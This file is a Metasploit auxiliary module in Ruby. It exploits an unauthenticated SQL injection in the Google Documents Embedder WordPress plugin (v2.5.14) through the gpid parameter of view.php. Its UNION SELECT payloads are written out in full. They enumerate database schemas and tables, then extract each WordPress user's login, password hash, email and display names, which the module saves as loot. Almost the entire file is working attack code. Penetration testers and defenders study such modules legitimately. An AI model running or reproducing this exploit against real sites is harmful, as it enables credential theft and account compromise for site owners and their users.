##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Google Documents Embedder Unauthenticated User/Hash Enum via SQLi',
      'Description'    => %q{

      This module exploits an unauthenticated SQL injection in Google Documents Embedder v2.5.14
      in order to pull the users and their password hashes from the database
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module
        ],
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/35371/']
        ],
      'DisclosureDate' => 'Nov 25 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Wordpress directory path", '/']),
      ], self.class)

  end

  def run
    left_marker = Rex::Text.rand_text_alpha(6)
    right_marker = Rex::Text.rand_text_alpha(6)

    get_schema_count = "UNION SELECT 1, 2, 3, CONCAT(CAST(CHAR(97, 58, 49, 58, 123, 115, 58, 54, 58, 34, 118, 119, 95, 99, 115, 115, 34, 59, 115, 58) as CHAR), LENGTH(CONCAT(0x#{left_marker.unpack("H*")[0]},(select count(*) from information_schema.schemata limit 0,1),0x#{right_marker.unpack("H*")[0]})), CAST(CHAR(58, 34) as CHAR), CONCAT(0x#{left_marker.unpack("H*")[0]},(select count(*) from information_schema.schemata limit 0,1),0x#{right_marker.unpack("H*")[0]}), CAST(CHAR(34, 59, 125) as CHAR));#"

    res = send_injected_request(get_schema_count)

    count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

    schemas = []
    data = "id,username,hash,email,nicename,displayname\n"
    0.upto(count-1) do |i|
      get_schema = "UNION SELECT 1, 2, 3, CONCAT(CAST(CHAR(97, 58, 49, 58, 123, 115, 58, 54, 58, 34, 118, 119, 95, 99, 115, 115, 34, 59, 115, 58) as CHAR), LENGTH(CONCAT(0x#{left_marker.unpack("H*")[0]}, (select schema_name from information_schema.schemata limit #{i},1), 0x#{right_marker.unpack("H*")[0]})), CAST(CHAR(58, 34) as CHAR), CONCAT(0x#{left_marker.unpack("H*")[0]}, (select schema_name from information_schema.schemata limit #{i},1), 0x#{right_marker.unpack("H*")[0]}), CAST(CHAR(34, 59, 125) as CHAR));#"

      res = send_injected_request(get_schema)

      schemas << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    schemas.delete('mysql')
    schemas.delete('information_schema')
    schemas.delete('performance_schema')

    schemas.each do |schema|
      print_status("Looking in schema: " + schema)
      get_table_count = "UNION SELECT 1, 2, 3, CONCAT(CAST(CHAR(97, 58, 49, 58, 123, 115, 58, 54, 58, 34, 118, 119, 95, 99, 115, 115, 34, 59, 115, 58) as CHAR), LENGTH(CONCAT(0x#{left_marker.unpack("H*")[0]}, (select count(*) from information_schema.tables where table_schema = 0x#{schema.unpack("H*")[0]} limit 0,1), 0x#{right_marker.unpack("H*")[0]})), CAST(CHAR(58, 34) as CHAR), CONCAT(0x#{left_marker.unpack("H*")[0]}, (select count(*) from information_schema.tables where table_schema = 0x#{schema.unpack("H*")[0]} limit 0,1), 0x#{right_marker.unpack("H*")[0]}), CAST(CHAR(34, 59, 125) as CHAR));#"

      res = send_injected_request(get_table_count)
      count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

      tables = []
      0.upto(count-1) do |i|
        get_table = "UNION SELECT 1, 2, 3, CONCAT(CAST(CHAR(97, 58, 49, 58, 123, 115, 58, 54, 58, 34, 118, 119, 95, 99, 115, 115, 34, 59, 115, 58) as CHAR), LENGTH(CONCAT(0x#{left_marker.unpack("H*")[0]}, (select table_name from information_schema.tables where table_schema = 0x#{schema.unpack("H*")[0]} limit #{i},1), 0x#{right_marker.unpack("H*")[0]})), CAST(CHAR(58, 34) as CHAR), CONCAT(0x#{left_marker.unpack("H*")[0]}, (select table_name from information_schema.tables where table_schema = 0x#{schema.unpack("H*")[0]} limit #{i},1), 0x#{right_marker.unpack("H*")[0]}), CAST(CHAR(34, 59, 125) as CHAR));#"

        res = send_injected_request(get_table)

        table = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
        tables << table if table =~ /users$/
      end

      tables.each do |table|
        print_status("Looking in table: " + table)
        get_row_count = "UNION SELECT 1, 2, 3, CONCAT(CAST(CHAR(97, 58, 49, 58, 123, 115, 58, 54, 58, 34, 118, 119, 95, 99, 115, 115, 34, 59, 115, 58) as CHAR), LENGTH(CONCAT(0x#{left_marker.unpack("H*")[0]}, (select count(*) from #{schema}.#{table} limit 0,1), 0x#{right_marker.unpack("H*")[0]})), CAST(CHAR(58, 34) as CHAR), CONCAT(0x#{left_marker.unpack("H*")[0]}, (select count(*) from #{schema}.#{table} limit 0,1), 0x#{right_marker.unpack("H*")[0]}), CAST(CHAR(34, 59, 125) as CHAR));#"

        res = send_injected_request(get_row_count)

        count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

        0.upto(count-1) do |i|
          get_row = "UNION SELECT 1, 2, 3, CONCAT(CAST(CHAR(97, 58, 49, 58, 123, 115, 58, 54, 58, 34, 118, 119, 95, 99, 115, 115, 34, 59, 115, 58) as CHAR), LENGTH(CONCAT(0x#{left_marker.unpack("H*")[0]},(select id from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select user_login from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select user_pass from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select display_name from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select user_email from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select user_nicename from #{schema}.#{table} limit #{i},1), 0x#{right_marker.unpack("H*")[0]})), CAST(CHAR(58, 34) as CHAR), CONCAT(0x#{left_marker.unpack("H*")[0]},(select id from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select user_login from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select user_pass from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select display_name from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select user_email from #{schema}.#{table} limit #{i},1),0x#{left_marker.unpack("H*")[0]}, (select user_nicename from #{schema}.#{table} limit #{i},1), 0x#{right_marker.unpack("H*")[0]}), CAST(CHAR(34, 59, 125) as CHAR));#"

          res = send_injected_request(get_row)

          next if not res.body =~ /#{left_marker}(.*)#{left_marker}(.*)#{left_marker}(.*)#{left_marker}(.*)#{left_marker}(.*)#{left_marker}(.*)#{right_marker}/

          data << $1 + "," + $2 + "," + $3 + "," + $5 + "," + $4 + "," + $6
        end
      end
    end

    path = store_loot("wordpress.users", "text/plain", datastore['RHOST'], data)
    print_status ("Users saved to #{path}")
  end

  def send_injected_request(str)
    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'google-document-embedder', 'view.php'),
      'vars_get' => {
        'embedded' => '1',
        'gpid' => '0 ' + str
      }
    })
  end
end

